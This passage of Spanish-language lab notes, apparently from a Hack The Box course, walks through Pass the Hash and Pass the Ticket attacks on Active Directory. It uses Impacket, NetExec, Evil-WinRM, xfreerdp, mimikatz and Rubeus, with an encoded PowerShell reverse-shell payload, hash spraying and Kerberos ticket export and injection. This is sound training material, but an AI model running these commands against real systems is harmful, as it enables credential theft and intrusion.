PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01

```

El resultado es una conexión de shell inversa desde el host DC01 (172.16.1.10). 


![Pasted image 20250704030521.png](/img/user/imgs/Pasted%20image%2020250704030521.png)

## Pass the Hash with Impacket (Linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) tiene varias herramientas que podemos utilizar para diferentes operaciones como: `Command Execution` y `Credential Dumping`, `Enumeration`, etc. 


### Pass the Hash with Impacket PsExec

``` css
MrBloody@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Hay varias otras herramientas en el kit de herramientas Impacket que podemos usar para la ejecución de comandos mediante ataques Pass the Hash, como:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)


# Pass the Hash with NetExec (Linux)

[Netexec](https://github.com/Pennyw0rth/NetExec) es una herramienta de ``post-explotación`` que ayuda a automatizar la evaluación de la seguridad de grandes redes de ``Active Directory``. Podemos usar ``NetExec`` para intentar autenticarnos en algunos o todos los hosts de una red, buscando un host donde podamos autenticarnos correctamente como administrador local. Este método también se denomina "Spray de contraseñas". el módulo `Active Directory Enumeration & Attacks`. Tenga en cuenta que este método puede bloquear cuentas de dominio.



#### Pass the hash with Netexec

``` css
MrBloody@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```


Si queremos realizar las mismas acciones pero intentar autenticarnos en cada host en una subred usando el hash de contraseña del administrador local, podríamos agregar `--local-auth` a nuestro comando. 

Este método es útil si obtenemos un hash de administrador local volcando la base de datos SAM local en un host y queremos comprobar a cuántos otros hosts (si los hay) podemos acceder gracias a la reutilización de la contraseña de administrador.

Si vemos `Pwn3d!` significa que el usuario es administrador local en el equipo de destino. 


#### NetExec - Command Execution

``` css
MrBloody@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator

```

Revise la [documentación Wiki de NetExec](https://www.netexec.wiki/) para obtener más información sobre las amplias funciones de la herramienta.


# Pass the Hash with Evil-Winrm (Linux)

``Evil-WinRM`` es otra herramienta que podemos usar para autenticarnos mediante el ataque ``"Pasar el Hash"`` con comunicación remota de PowerShell. Si SMB está bloqueado o no tenemos permisos de administrador, podemos usar este protocolo alternativo para conectarnos a la máquina objetivo.

 
## Pass the Hash with Evil-Winrm

``` css
MrBloody@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```


# Pass the Hash with RDP

Podemos realizar un ataque RDP Pth para obtener acceso GUI al sistema de destino utilizando herramientas como `xfreerdp`.

Este ataque tiene algunas salvedades:

``Restricted Admin Mode``, que está deshabilitado de forma predeterminada, debe estar habilitado en el host de destino; de lo contrario, se le presentará el siguiente error:

![Pasted image 20250707020740.png](/img/user/imgs/Pasted%20image%2020250707020740.png)

Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) bajo ``HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`` con el valor 0. Se puede hacer usando el siguiente comando:

#### Enable Restricted Admin Mode to allow PtH

``` css
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![Pasted image 20250707021048.png](/img/user/imgs/Pasted%20image%2020250707021048.png)


Una vez agregada la clave de registro, podemos usar ``xfreerdp`` con la opción ``/pth`` para obtener acceso RDP:

### Pass the hash via RDP

``` css
MrBloody@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```


![Pasted image 20250707021352.png](/img/user/imgs/Pasted%20image%2020250707021352.png)


# UAC Pass the Hash Limits for Local Accounts

El UAC (Control de cuentas de usuario) limita la capacidad de los usuarios locales para realizar operaciones de administración remota. Cuando la clave de registro...

``HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`` si se establece en 0, significa que la cuenta de administrador local integrada ``(RID-500, "Administrador")`` es la única cuenta local autorizada para realizar tareas de administración remota. Si se establece en 1, también se permiten las demás cuentas de administrador local. 


> [!NOTE] Nota:
> Hay una excepción, si la clave de registro ``FilterAdministratorToken`` (deshabilitado por defecto) está habilitado (valor 1), la cuenta RID 500 ``(incluso si se le cambia el nombre)`` está inscrita en la protección ``UAC``. Esto significa que el ``PTH remoto`` fallará contra la máquina al usar esa cuenta. 


Estas configuraciones son solo para cuentas administrativas locales. Si accedemos a una cuenta de dominio con derechos administrativos en un equipo, podemos usar Pass-the-Hash en ese equipo.


![Pasted image 20250707031058.png](/img/user/imgs/Pasted%20image%2020250707031058.png)

![Pasted image 20250707033800.png](/img/user/imgs/Pasted%20image%2020250707033800.png)

``` css
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```


## Pass the Ticket (PtT) Windows

Otro método para realizar ataques laterales en un entorno Active Directory se denomina `ataque Pass the Ticket (PtT)`. En este ataque, se utiliza un ticket Kerberos robado para realizar ataques laterales en lugar de un Hash de password NTML.


## Kerberos Protocol Update

El sistema de autenticación Kerberos se basa en tickets. La idea central de Kerberos no es asignar una contraseña a cada servicio que se utiliza.

En su lugar, Kerberos conserva todos los tickets en el sistema local y presenta a cada servicio únicamente el ticket específico, lo que impide que un ticket se utilice para otro fin.

![Pasted image 20250707213119.png](/img/user/imgs/Pasted%20image%2020250707213119.png)

Cuando un usuario solicita un TGT, deben autenticarse ante el controlador de dominio cifrando la marca de tiempo actual con el hash de su password. Una vez que el controlador de dominio valida la identidad del usuario (dado que el dominio conoce el hash de su password, lo que significa que puede descifrar la marca de tiempo), le envía un TGT para futuras solicitudes.

Una vez que el usuario recibe su ticket, no tiene que demostrar su identidad con su contraseña.

## Pass the Ticket (PtT) Attack

Necesitamos un ticket ``Kerberos`` válido para realizar un ataque ``Pass the Ticket (PtT)``. Puede ser:

![Pasted image 20250707214358.png](/img/user/imgs/Pasted%20image%2020250707214358.png)

Antes de realizar un ataque `Pass the Ticket (PtT)`, veamos algunos métodos para obtener un ticket usando `Mimikatz` y `Rubeus`

### Script

Imaginemos que estamos realizando una prueba de penetración y conseguimos suplantar la identidad de un usuario y acceder a su ordenador. 

Encontramos una forma de obtener privilegios administrativos en este ordenador y trabajamos con derechos de administrador local.


#### Collecting Kerberos tickets from Windows

En Windows, los tickets son procesados ​​y almacenados por el proceso LSASS (Servicio del Subsistema de Autoridad de Seguridad Local). Por lo tanto, para obtener un ticket de un sistema Windows, debe comunicarse con LSASS y solicitarlo.

``Como usuario no administrador, solo puede obtener sus tickets``, pero como administrador local, puede recopilar todo.

Podemos recolectar todos los tickets de un sistema usando el módulo `Mimikatz` `sekurlsa::tickets /export` el resultado es una lista de archivos con la extensión `.kirbi`, que contenían los tickets.


# Mimikatz - Ticket Export

``` python
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 329278 (00000000:0005063e)
Session           : Network from 0
User Name         : DC01$
Domain            : HTB
Logon Server      : (null)
Logon Time        : 7/12/2022 9:39:55 AM
SID               : S-1-5-18

         * Username : DC01$
         * Domain   : inlanefreight.htb
         * Password : (null)
         
        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
           Target Name  (--) : @ inlanefreight.htb
           Client Name  (01) : DC01$ ; @ inlanefreight.htb
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             31cfa427a01e10f6e09492f2e8ddf7f74c79a5ef6b725569e19d614a35a69c07
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !

        Group 2 - Ticket Granting Ticket

mimikatz # exit
Bye!

c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
```

Los billetes que terminan con ``$``, corresponden a la cuenta del equipo, que necesita un ticket para interactuar con Active Directory. 

Los tickets de usuario contienen el nombre del usuario, seguido de un ...``@`` que separa del servicio y el dominio, por ejemplo: 

``[randomvalue]-username@service-domain.local.kirbi``



> [!NOTE] Nota:
> Si eliges un ticket con el servicio krbtgt, corresponde al TGT de esa cuenta. 

también podemos exportar tickets usando `Rubeus` y la opción `dump` se puede utilizar para volcar todos los tickets (si se ejecuta como administrator local)


# Rubeus - Exports Tickets

``` python
c:\tools> Rubeus.exe dump /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x6c680
    ServiceName           :  krbtgt/inlanefreight.htb
    ServiceRealm          :  inlanefreight.htb
    UserName              :  DC01$
    UserRealm             :  inlanefreight.htb
    StartTime             :  7/12/2022 9:39:54 AM
    EndTime               :  7/12/2022 7:39:54 PM
    RenewTill             :  7/19/2022 9:39:54 AM
    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
    Base64EncodedTicket   :

doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2ihO+FY/2Rr0g0iHowOYOgn7EBV3JYEDTNZS2ErKNLVOh0/TczLexQk+bKTMh55oNNQDVzmarvzByKYC0XRTjb1jPuVz4exraxGEBTgJYUunCy/R5agIa6xuuGUvXL+6AbHLvMb+ObdU7Dyn9eXruBscIBX5k3D3S5sNuEnm1sHVsGuDBAN5Ko6kZQRTx22A+lZZD12ymv9rh8S41z0+pfINdXx/VQAxYRL5QKdjbndchgpJro4mdzuEiu8wYOxbpJdzMANSSQiep+wOTUMgimcHCCCrhXdyR7VQoRjjdmTrKbPVGltBOAWQOrFs6YK1OdxBles1GEibRnaoT9qwEmXOa4ICzhjHgph36TQIwoRC+zjPMZl9lf+qtpuOQK86aG7Uwv7eyxwSa1/H0mi5B+un2xKaRmj/mZHXPdT7B5Ruwct93F2zQQ1mKIH0qLZO1Zv/G0IrycXxoE5MxMLERhbPl4Vx1XZGJk2a3m8BmsSZJt/++rw7YE/vmQiW6FZBO/2uzMgPJK9xI8kaJvTOmfJQwVlJslsjY2RAVGly1B0Y80UjeN8iVmKCk3Jvz4QUCLK2zZPWKCn+qMTtvXBqx80VH1hyS8FwU3oh90IqNS1VFbDjZdEQpBGCE/mrbQ2E/rGDKyGvIZfCo7t+kuaCivnY8TTPFszVMKTDSZ2WhFtO2fipId+shPjk3RLI89BT4+TDzGYKU2ipkXm5cEUnNis4znYVjGSIKhtrHltnBO3d1pw402xVJ5lbT+yJpzcEc5N7xBkymYLHAbM9DnDpJ963RN/0FcZDusDdorHA1DxNUCHQgvK17iametKsz6Vgw0zVySsPp/wZ/tssglp5UU6in1Bq91hA2c35l8M1oGkCqiQrfY8x3GNpMPixwBdd2OU1xwn/gaon2fpWEPFzKgDRtKe1FfTjoEySGr38QSs1+JkVk0HTRUbx9Nnq6w3W+D1p+FSCRZyCF/H1ahT9o0IRkFiOj0Cud5wyyEDom08wOmgwxK0D/0aisBTRzmZrSfG7Kjm9/yNmLB5va1yD3IyFiMreZZ2WRpNyK0G6L4H7NBZPcxIgE/Cxx/KduYTPnBDvwb6uUDMcZR83lVAQ5NyHHaHUOjoWsawHraI4uYgmCqXYN7yYmJPKNDI290GMbn1zIPSSL82V3hRbOO8CZNP/f64haRlR63GJBGaOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oCswKaADAgESoSIEIClgTKTOAY3p4054sB9McPBYb2xUn/kgVWSSXFoFCot8oQkbB0hUQi5DT02iEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIyMDcxMjEzMzk1NFqmERgPMjAyMjA3MTIyMzM5NTRapxEYDzIwMjIwNzE5MTMzOTU0WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdIVEIuQ09N

  UserName                 : plaintext
  Domain                   : HTB
  LogonId                  : 0x6c680
  UserSID                  : S-1-5-21-228825152-3134732153-3833540767-1107
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 7/12/2022 9:42:15 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : inlanefreight.htb
  UserPrincipalName        : plaintext@inlanefreight.htb


    ServiceName           :  krbtgt/inlanefreight.htb
    ServiceRealm          :  inlanefreight.htb
    UserName              :  plaintext
    UserRealm             :  inlanefreight.htb
    StartTime             :  7/12/2022 9:42:15 AM
    EndTime               :  7/12/2022 7:42:15 PM
    RenewTill             :  7/19/2022 9:42:15 AM
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  2NN3wdC4FfpQunUUgK+MZO8f20xtXF0dbmIagWP0Uu0=
    Base64EncodedTicket   :

doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT02jggPLMIIDx6ADAgESoQMCAQKiggO5BIIDtc6ptErl3sAxJsqVTkV84/IcqkpopGPYMWzPcXaZgPK9hL0579FGJEBXX+Ae90rOcpbrbErMr52WEVa/E2vVsf37546ScP0+9LLgwOAoLLkmXAUqP4zJw47nFjbZQ3PHs+vt6LI1UnGZoaUNcn1xI7VasrDoFakj/ZH+GZ7EjgpBQFDZy0acNL8cK0AIBIe8fBF5K7gDPQugXaB6diwoVzaO/E/p8m3t35CR1PqutI5SiPUNim0s/snipaQnyuAZzOqFmhwPPujdwOtm1jvrmKV1zKcEo2CrMb5xmdoVkSn4L6AlX328K0+OUILS5GOe2gX6Tv1zw1F9ANtEZF6FfUk9A6E0dc/OznzApNlRqnJ0dq45mD643HbewZTV8YKS/lUovZ6WsjsyOy6UGKj+qF8WsOK1YsO0rW4ebWJOnrtZoJXryXYDf+mZ43yKcS10etHsq1B2/XejadVr1ZY7HKoZKi3gOx3ghk8foGPfWE6kLmwWnT16COWVI69D9pnxjHVXKbB5BpQWAFUtEGNlj7zzWTPEtZMVGeTQOZ0FfWPRS+EgLmxUc47GSVON7jhOTx3KJDmE7WHGsYzkWtKFxKEWMNxIC03P7r9seEo5RjS/WLant4FCPI+0S/tasTp6GGP30lbZT31WQER49KmSC75jnfT/9lXMVPHsA3VGG2uwGXbq1H8UkiR0ltyD99zDVTmYZ1aP4y63F3Av9cg3dTnz60hNb7H+AFtfCjHGWdwpf9HZ0u0HlBHSA7pYADoJ9+ioDghL+cqzPn96VyDcqbauwX/FqC/udT+cgmkYFzSIzDhZv6EQmjUL4b2DFL/Mh8BfHnFCHLJdAVRdHlLEEl1MdK9/089O06kD3qlE6s4hewHwqDy39ORxAHHQBFPU211nhuU4Jofb97d7tYxn8f8c5WxZmk1nPILyAI8u9z0nbOVbdZdNtBg5sEX+IRYyY7o0z9hWJXpDPuk0ksDgDckPWtFvVqX6Cd05yP2OdbNEeWns9JV2D5zdS7Q8UMhVo7z4GlFhT/eOopfPc0bxLoOv7y4fvwhkFh/9LfKu6MLFneNff0Duzjv9DQOFd1oGEnA4MblzOcBscoH7CuscQQ8F5xUCf72BVY5mShq8S89FG9GtYotmEUe/j+Zk6QlGYVGcnNcDxIRRuyI1qJZxCLzKnL1xcKBF4RblLcUtkYDT+mZlCSvwWgpieq1VpQg42Cjhxz/+xVW4Vm7cBwpMc77Yd1+QFv0wBAq5BHvPJI4hCVPs7QejgdgwgdWgAwIBAKKBzQSByn2BxzCBxKCBwTCBvjCBu6ArMCmgAwIBEqEiBCDY03fB0LgV+lC6dRSAr4xk7x/bTG1cXR1uYhqBY/RS7aEJGwdIVEIuQ09NohYwFKADAgEBoQ0wCxsJcGxhaW50ZXh0owcDBQBA4QAApREYDzIwMjIwNzEyMTM0MjE1WqYRGA8yMDIyMDcxMjIzNDIxNVqnERgPMjAyMjA3MTkxMzQyMTVaqAkbB0hUQi5DT02pHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT00=
<SNIP>
```



> [!NOTE] Nota:
> 

Para recolectar todos los tickets necesitamos ejecutar ``Mimikatz`` o ``Rubeus`` como administrador.


# Pase el ticket con PowerShell Remoting (Windows) 

PowerShell Remoting permite ejecutar scripts o comandos en un equipo remoto. Los administradores suelen usar PowerShell Remoting para administrar equipos remotos en la red. Al habilitar PowerShell Remoting, se crean escuchas HTTP y HTTPS. La escucha se ejecuta en el puerto estándar TCP/5985 para HTTP y TCP/5986 para HTTPS. 


Supongamos que encontramos una cuenta de usuario sin privilegios administrativos en un equipo remoto, pero que pertenece al grupo Usuarios de administración remota. En ese caso, podemos usar PowerShell Remoting para conectarnos a ese equipo y ejecutar comandos. 


## Mimikatz - PowerShell Remoting with Pass the Ticket


Para usar PowerShell Remoting con Pass the Ticket, podemos usar Mimikatz para importar nuestro ticket y luego abrir una consola de PowerShell y conectarnos a la máquina de destino.

``` css
C:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```



## Rubeus - PowerShell Remote Connection with Pass the Ticket

Rubeus tiene la opción de `createnetonly`, que crea un proceso de sacrificio/sesión de inicio de sesión ([tipo de inicio de sesión 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). El proceso está oculto por defecto, pero podemos especificar el indicador. `/show` para mostrar el proceso, y el resultado es el equivalente a `runas /netonly`. Esto evita el borrado de los TGT existentes para la sesión de inicio de sesión actual.


### Create a sacrifice process with Rubeus

``` python
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3


[*] Action: Create process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : JMI8CL7C
[*] Domain          : DTCDV6VL
[*] Password        : MRWI6XGI
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648
```


El comando anterior abrirá una nueva ventana de comandos. Desde allí, podemos ejecutar Rubeus para solicitar un nuevo TGT con la opción `/ptt` para importar el ticket a nuestra sesión actual  



## Rubeus - Pass the Ticket for lateral movement


``` css
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\john'
[*] Using domain controller: 10.129.203.120:88
[+] TGT request successful!
[*] Base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRC
      oiYwJKADAgECoR0wGxsGa3JidGd0GxFpbmxhbmVmcmVpZ2h0Lmh0YqOCBFAwggRMoAMCARKhAwIBAqKC
      BD4EggQ6JFh+c/cFI8UqumM6GPaVpUhz3ZSyXZTIHiI/b3jOFtjyD/uYTqXAAq2CkakjomzCUyqUfIE5
      +2dvJYclANm44EvqGZlMkFvHK40slyFEK6E6d7O+BWtGye2ytdJr9WWKWDiQLAJ97nrZ9zhNCfeWWQNQ
      dpAEeCZP59dZeIUfQlM3+/oEvyJBqeR6mc3GuicxbJA743TLyQt8ktOHU0oIz0oi2p/VYQfITlXBmpIT
      OZ6+/vfpaqF68Y/5p61V+B8XRKHXX2JuyX5+d9i3VZhzVFOFa+h5+efJyx3kmzFMVbVGbP1DyAG1JnQO
      h1z2T1egbKX/Ola4unJQRZXblwx+xk+MeX0IEKqnQmHzIYU1Ka0px5qnxDjObG+Ji795TFpEo04kHRwv
      zSoFAIWxzjnpe4J9sraXkLQ/btef8p6qAfeYqWLxNbA+eUEiKQpqkfzbxRB5Pddr1TEONiMAgLCMgphs
      gVMLj6wtH+gQc0ohvLgBYUgJnSHV8lpBBc/OPjPtUtAohJoas44DZRCd7S9ruXLzqeUnqIfEZ/DnJh3H
      SYtH8NNSXoSkv0BhotVXUMPX1yesjzwEGRokLjsXSWg/4XQtcFgpUFv7hTYTKKn92dOEWePhDDPjwQmk
      H6MP0BngGaLK5vSA9AcUSi2l+DSaxaR6uK1bozMgM7puoyL8MPEhCe+ajPoX4TPn3cJLHF1fHofVSF4W
      nkKhzEZ0wVzL8PPWlsT+Olq5TvKlhmIywd3ZWYMT98kB2igEUK2G3jM7XsDgwtPgwIlP02bXc2mJF/VA
      qBzVwXD0ZuFIePZbPoEUlKQtE38cIumRyfbrKUK5RgldV+wHPebhYQvFtvSv05mdTlYGTPkuh5FRRJ0e
      WIw0HWUm3u/NAIhaaUal+DHBYkdkmmc2RTWk34NwYp7JQIAMxb68fTQtcJPmLQdWrGYEehgAhDT2hX+8
      VMQSJoodyD4AEy2bUISEz6x5gjcFMsoZrUmMRLvUEASB/IBW6pH+4D52rLEAsi5kUI1BHOUEFoLLyTNb
      4rZKvWpoibi5sHXe0O0z6BTWhQceJtUlNkr4jtTTKDv1sVPudAsRmZtR2GRr984NxUkO6snZo7zuQiud
      7w2NUtKwmTuKGUnNcNurz78wbfild2eJqtE9vLiNxkw+AyIr+gcxvMipDCP9tYCQx1uqCFqTqEImOxpN
      BqQf/MDhdvked+p46iSewqV/4iaAvEJRV0lBHfrgTFA3HYAhf062LnCWPTTBZCPYSqH68epsn4OsS+RB
